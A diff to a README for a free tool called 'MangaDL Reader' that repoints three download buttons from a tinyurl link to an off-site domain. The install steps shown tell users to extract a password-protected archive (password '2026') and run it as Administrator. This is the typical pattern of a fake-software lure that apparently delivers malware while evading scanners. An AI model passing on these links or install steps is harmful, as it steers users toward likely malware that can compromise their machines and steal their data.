@@ -9,7 +9,7 @@ The **📚 MangaDL Reader** is a **free** offline manga downloader and reader th
 
 <div align="center">
 
-[![Download MangaDL Reader](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/mangadl-read)
+[![Download MangaDL Reader](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/mangadl-read)
 
 </div>
 
@@ -110,7 +110,7 @@ Reading manga online requires constant internet access and suffers from slow loa
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download MangaDL Reader](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/mangadl-read)
+[![Download MangaDL Reader](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/mangadl-read)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -267,7 +267,7 @@ Read any manga offline for free. **MangaDL Reader** lets you download and read y
 
 <div align="center">
 
-[![Download MangaDL Reader](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/mangadl-read)
+[![Download MangaDL Reader](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/mangadl-read)
 
 **Version 4.6.1** — Free manga downloader & reader. April 2026 update. Zero cost. No payment.
 
